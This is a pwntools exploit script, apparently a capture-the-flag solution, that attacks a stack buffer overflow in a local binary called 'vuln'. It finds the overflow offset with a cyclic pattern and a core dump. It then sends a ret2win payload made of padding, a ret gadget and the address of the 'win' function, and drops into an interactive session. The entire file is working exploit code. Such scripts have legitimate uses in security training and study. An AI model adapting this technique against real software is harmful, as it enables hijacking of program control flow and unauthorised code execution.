from pwn import *
import sys
import os

def find_offset( exe: ELF ) -> int:

    pattern = cyclic( 100 )
    io      = process ( exe.path )

    io.sendline( pattern )
    io.wait()

    core = Coredump( './core' )
    io.close()
    return cyclic_find ( core.fault_addr , n = 4 )

def clean():
    os.system( 'rm -f core' )

exe               = ELF ( './vuln' )
context.binary    = exe
context.log_level = 'info'

if args.REMOTE:
    
    io = remote( '127.0.0.1', 5000 )
else:
    io = process( exe.path )


"""
====================================
    IGNORE ABOVE CODE (SETUP)
====================================
"""

try:
    win  = exe.symbols[ 'win' ]
    log.success( f"found win at: {hex( win )}" )
except Exception as e:
    log.failure( "win not found" )
    sys.exit( 1 )

padding = find_offset( exe )
payload = b'A' * padding
payload += p64( 0x401016 ) # 0x0000000000401016 : ret ; ROPgadget --binary vuln | grep ret
payload += p64( win )

io.sendline( payload )
io.interactive()

io.close()
clean()